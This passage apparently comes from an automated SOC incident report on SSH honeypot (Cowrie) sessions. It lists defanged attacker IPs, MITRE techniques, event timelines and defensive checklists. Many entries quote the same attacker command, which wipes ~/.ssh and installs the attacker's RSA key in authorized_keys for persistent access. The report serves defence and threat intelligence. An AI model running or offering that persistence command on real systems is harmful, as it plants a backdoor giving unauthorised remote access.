- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60985f52bf2d

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:21 |
| **Last Seen** | 2026-06-09 09:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:21:28` | `cowrie.session.connect` |
| `2026-06-09 09:21:28` | `cowrie.client.version` |
| `2026-06-09 09:21:28` | `cowrie.client.kex` |
| `2026-06-09 09:21:30` | `cowrie.login.success` |
| `2026-06-09 09:21:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bca98091eee7

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 09:21 |
| **Last Seen** | 2026-06-09 09:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:21:34` | `cowrie.session.connect` |
| `2026-06-09 09:21:34` | `cowrie.client.version` |
| `2026-06-09 09:21:34` | `cowrie.client.kex` |
| `2026-06-09 09:21:35` | `cowrie.login.success` |
| `2026-06-09 09:21:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-417448c12948

| Field | Detail |
|---|---|
| **Source IP** | `43.166.137[.]151` |
| **First Seen** | 2026-06-09 09:22 |
| **Last Seen** | 2026-06-09 09:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:22:36` | `cowrie.session.connect` |
| `2026-06-09 09:22:36` | `cowrie.client.version` |
| `2026-06-09 09:22:36` | `cowrie.client.kex` |
| `2026-06-09 09:22:37` | `cowrie.login.success` |
| `2026-06-09 09:22:37` | `cowrie.session.params` |
| `2026-06-09 09:22:37` | `cowrie.command.input` |
| `2026-06-09 09:22:37` | `cowrie.command.failed` |
| `2026-06-09 09:22:38` | `cowrie.log.closed` |
| `2026-06-09 09:22:38` | `cowrie.session.params` |
| `2026-06-09 09:22:38` | `cowrie.command.input` |
| `2026-06-09 09:22:39` | `cowrie.session.file_download` |
| `2026-06-09 09:22:39` | `cowrie.log.closed` |
| `2026-06-09 09:22:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.166.137[.]151` to AbuseIPDB if not already reported
- [ ] Block `43.166.137[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93ba34b09e24

| Field | Detail |
|---|---|
| **Source IP** | `43.166.137[.]151` |
| **First Seen** | 2026-06-09 09:22 |
| **Last Seen** | 2026-06-09 09:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:22:42` | `cowrie.session.connect` |
| `2026-06-09 09:22:42` | `cowrie.client.version` |
| `2026-06-09 09:22:42` | `cowrie.client.kex` |
| `2026-06-09 09:22:43` | `cowrie.login.success` |
| `2026-06-09 09:22:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.166.137[.]151` to AbuseIPDB if not already reported
- [ ] Block `43.166.137[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f4a49d9f642

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:23 |
| **Last Seen** | 2026-06-09 09:23 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:23:29` | `cowrie.session.connect` |
| `2026-06-09 09:23:29` | `cowrie.client.version` |
| `2026-06-09 09:23:30` | `cowrie.client.kex` |
| `2026-06-09 09:23:31` | `cowrie.login.success` |
| `2026-06-09 09:23:32` | `cowrie.session.params` |
| `2026-06-09 09:23:32` | `cowrie.command.input` |
| `2026-06-09 09:23:32` | `cowrie.command.failed` |
| `2026-06-09 09:23:32` | `cowrie.log.closed` |
| `2026-06-09 09:23:33` | `cowrie.session.params` |
| `2026-06-09 09:23:33` | `cowrie.command.input` |
| `2026-06-09 09:23:33` | `cowrie.session.file_download` |
| `2026-06-09 09:23:33` | `cowrie.log.closed` |
| `2026-06-09 09:23:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4248e8a8191c

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:23 |
| **Last Seen** | 2026-06-09 09:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:23:36` | `cowrie.session.connect` |
| `2026-06-09 09:23:36` | `cowrie.client.version` |
| `2026-06-09 09:23:37` | `cowrie.client.kex` |
| `2026-06-09 09:23:38` | `cowrie.login.success` |
| `2026-06-09 09:23:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7494cbdd0bd

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:25 |
| **Last Seen** | 2026-06-09 09:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:25:03` | `cowrie.session.connect` |
| `2026-06-09 09:25:03` | `cowrie.client.version` |
| `2026-06-09 09:25:03` | `cowrie.client.kex` |
| `2026-06-09 09:25:03` | `cowrie.login.success` |
| `2026-06-09 09:25:03` | `cowrie.session.params` |
| `2026-06-09 09:25:03` | `cowrie.command.input` |
| `2026-06-09 09:25:03` | `cowrie.command.failed` |
| `2026-06-09 09:25:04` | `cowrie.log.closed` |
| `2026-06-09 09:25:04` | `cowrie.session.params` |
| `2026-06-09 09:25:04` | `cowrie.command.input` |
| `2026-06-09 09:25:04` | `cowrie.session.file_download` |
| `2026-06-09 09:25:04` | `cowrie.log.closed` |
| `2026-06-09 09:25:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5424287babb

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:25 |
| **Last Seen** | 2026-06-09 09:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:25:06` | `cowrie.session.connect` |
| `2026-06-09 09:25:06` | `cowrie.client.version` |
| `2026-06-09 09:25:06` | `cowrie.client.kex` |
| `2026-06-09 09:25:06` | `cowrie.login.success` |
| `2026-06-09 09:25:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d5b8ecd76c7

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:25 |
| **Last Seen** | 2026-06-09 09:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:25:39` | `cowrie.session.connect` |
| `2026-06-09 09:25:39` | `cowrie.client.version` |
| `2026-06-09 09:25:40` | `cowrie.client.kex` |
| `2026-06-09 09:25:41` | `cowrie.login.success` |
| `2026-06-09 09:25:42` | `cowrie.session.params` |
| `2026-06-09 09:25:42` | `cowrie.command.input` |
| `2026-06-09 09:25:42` | `cowrie.command.failed` |
| `2026-06-09 09:25:42` | `cowrie.log.closed` |
| `2026-06-09 09:25:43` | `cowrie.session.params` |
| `2026-06-09 09:25:43` | `cowrie.command.input` |
| `2026-06-09 09:25:43` | `cowrie.session.file_download` |
| `2026-06-09 09:25:43` | `cowrie.log.closed` |
| `2026-06-09 09:25:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bdd1d23530d

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:25 |
| **Last Seen** | 2026-06-09 09:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:25:47` | `cowrie.session.connect` |
| `2026-06-09 09:25:47` | `cowrie.client.version` |
| `2026-06-09 09:25:47` | `cowrie.client.kex` |
| `2026-06-09 09:25:48` | `cowrie.login.success` |
| `2026-06-09 09:25:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46c0f21d3498

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:26 |
| **Last Seen** | 2026-06-09 09:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:26:57` | `cowrie.session.connect` |
| `2026-06-09 09:26:57` | `cowrie.client.version` |
| `2026-06-09 09:26:57` | `cowrie.client.kex` |
| `2026-06-09 09:26:58` | `cowrie.login.success` |
| `2026-06-09 09:26:58` | `cowrie.session.params` |
| `2026-06-09 09:26:58` | `cowrie.command.input` |
| `2026-06-09 09:26:58` | `cowrie.command.failed` |
| `2026-06-09 09:26:58` | `cowrie.log.closed` |
| `2026-06-09 09:26:58` | `cowrie.session.params` |
| `2026-06-09 09:26:58` | `cowrie.command.input` |
| `2026-06-09 09:26:58` | `cowrie.session.file_download` |
| `2026-06-09 09:26:58` | `cowrie.log.closed` |
| `2026-06-09 09:27:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-179089d03057

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:27 |
| **Last Seen** | 2026-06-09 09:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:27:00` | `cowrie.session.connect` |
| `2026-06-09 09:27:00` | `cowrie.client.version` |
| `2026-06-09 09:27:00` | `cowrie.client.kex` |
| `2026-06-09 09:27:01` | `cowrie.login.success` |
| `2026-06-09 09:27:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-919a5a508729

| Field | Detail |
|---|---|
| **Source IP** | `43.166.137[.]151` |
| **First Seen** | 2026-06-09 09:27 |
| **Last Seen** | 2026-06-09 09:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:27:33` | `cowrie.session.connect` |
| `2026-06-09 09:27:33` | `cowrie.client.version` |
| `2026-06-09 09:27:33` | `cowrie.client.kex` |
| `2026-06-09 09:27:34` | `cowrie.login.success` |
| `2026-06-09 09:27:35` | `cowrie.session.params` |
| `2026-06-09 09:27:35` | `cowrie.command.input` |
| `2026-06-09 09:27:35` | `cowrie.command.failed` |
| `2026-06-09 09:27:35` | `cowrie.log.closed` |
| `2026-06-09 09:27:35` | `cowrie.session.params` |
| `2026-06-09 09:27:35` | `cowrie.command.input` |
| `2026-06-09 09:27:36` | `cowrie.session.file_download` |
| `2026-06-09 09:27:36` | `cowrie.log.closed` |
| `2026-06-09 09:27:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.166.137[.]151` to AbuseIPDB if not already reported
- [ ] Block `43.166.137[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c24e36249b26

| Field | Detail |
|---|---|
| **Source IP** | `43.166.137[.]151` |
| **First Seen** | 2026-06-09 09:27 |
| **Last Seen** | 2026-06-09 09:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:27:39` | `cowrie.session.connect` |
| `2026-06-09 09:27:39` | `cowrie.client.version` |
| `2026-06-09 09:27:39` | `cowrie.client.kex` |
| `2026-06-09 09:27:40` | `cowrie.login.success` |
| `2026-06-09 09:27:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.166.137[.]151` to AbuseIPDB if not already reported
- [ ] Block `43.166.137[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c098e65176a

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:27 |
| **Last Seen** | 2026-06-09 09:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:27:50` | `cowrie.session.connect` |
| `2026-06-09 09:27:50` | `cowrie.client.version` |
| `2026-06-09 09:27:50` | `cowrie.client.kex` |
| `2026-06-09 09:27:51` | `cowrie.login.success` |
| `2026-06-09 09:27:52` | `cowrie.session.params` |
| `2026-06-09 09:27:52` | `cowrie.command.input` |
| `2026-06-09 09:27:52` | `cowrie.command.failed` |
| `2026-06-09 09:27:53` | `cowrie.log.closed` |
| `2026-06-09 09:27:53` | `cowrie.session.params` |
| `2026-06-09 09:27:53` | `cowrie.command.input` |
| `2026-06-09 09:27:53` | `cowrie.session.file_download` |
| `2026-06-09 09:27:53` | `cowrie.log.closed` |
| `2026-06-09 09:27:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d65d8bc7be59

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:27 |
| **Last Seen** | 2026-06-09 09:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:27:57` | `cowrie.session.connect` |
| `2026-06-09 09:27:57` | `cowrie.client.version` |
| `2026-06-09 09:27:57` | `cowrie.client.kex` |
| `2026-06-09 09:27:59` | `cowrie.login.success` |
| `2026-06-09 09:27:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb89713a4e6b

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 09:28 |
| **Last Seen** | 2026-06-09 09:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:28:41` | `cowrie.session.connect` |
| `2026-06-09 09:28:41` | `cowrie.client.version` |
| `2026-06-09 09:28:41` | `cowrie.client.kex` |
| `2026-06-09 09:28:42` | `cowrie.login.success` |
| `2026-06-09 09:28:43` | `cowrie.session.params` |
| `2026-06-09 09:28:43` | `cowrie.command.input` |
| `2026-06-09 09:28:43` | `cowrie.command.failed` |
| `2026-06-09 09:28:43` | `cowrie.log.closed` |
| `2026-06-09 09:28:44` | `cowrie.session.params` |
| `2026-06-09 09:28:44` | `cowrie.command.input` |
| `2026-06-09 09:28:44` | `cowrie.session.file_download` |
| `2026-06-09 09:28:44` | `cowrie.log.closed` |
| `2026-06-09 09:28:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f144debf117f

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 09:28 |
| **Last Seen** | 2026-06-09 09:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:28:47` | `cowrie.session.connect` |
